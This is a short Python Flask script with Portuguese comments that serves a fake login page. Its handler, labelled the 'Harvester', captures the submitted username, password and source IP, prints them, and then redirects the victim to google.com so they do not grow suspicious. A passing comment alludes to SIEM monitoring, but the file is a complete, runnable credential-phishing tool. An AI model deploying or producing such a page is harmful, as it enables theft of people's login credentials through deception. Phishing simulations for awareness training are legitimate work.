from flask import Flask, redirect, render_template_string, request

app = Flask(__name__)

# Template HTML simulando a página de login
LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>Login</title></head>
<body>
    <h2>Acesse sua conta</h2>
    <form method="POST" action="/login">
        <label>Usuário:</label><br>
        <input type="text" name="username"><br>
        <label>Senha:</label><br>
        <input type="password" name="password"><br><br>
        <button type="submit">Entrar</button>
    </form>
</body>
</html>
"""


@app.route("/")
def home():
  return render_template_string(LOGIN_PAGE)


@app.route("/login", methods=["POST"])
def capture_credentials():
  # Capturando os dados enviados no formulário (O "Harvester")
  user = request.form.get("username")
  password = request.form.get("password")
  ip_origem = request.remote_addr

  # Em um sistema de monitoramento real, registraríamos este evento em um SIEM
  print(f"[ALERTA] Credencial interceptada de {ip_origem}:")
  print(f" -> Usuário: {user}")
  print(f" -> Senha: {password}")

  # Redireciona a vítima para o site oficial para não levantar suspeitas
  return redirect("https://www.google.com")


if __name__ == "__main__":
  # Roda localmente na porta 80 ou 5000
  app.run(host="0.0.0.0", port=5000)